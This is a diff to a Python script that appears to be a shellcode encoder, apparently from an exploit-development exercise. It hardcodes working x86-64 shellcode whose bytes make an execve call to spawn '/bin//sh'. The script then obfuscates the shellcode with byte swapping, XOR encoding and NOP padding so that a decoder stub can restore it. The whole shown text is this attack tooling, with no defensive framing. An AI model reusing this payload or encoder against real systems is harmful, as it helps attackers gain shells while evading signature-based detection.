@@ -20,7 +20,9 @@ def Print_To_Hex(data):
 
 
 
-shellcode = bytearray(sys.stdin.read())
+#shellcode = bytearray(sys.stdin.read())
+
+shellcode  = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
 
 print(len(shellcode))
 
@@ -51,7 +53,7 @@ for i in range(0 , len(temp)/2):
    swap = 0
 
 if len(shellcode) % 2 is 0:
-   temp.append(144) # 144 == 0x90 -> nop
+   temp.append(144) # 144 == 0x90 -> nop , more easy to configure decoder stub if len shellcode is odd
 
 for x in temp:
         # XOR Encoding
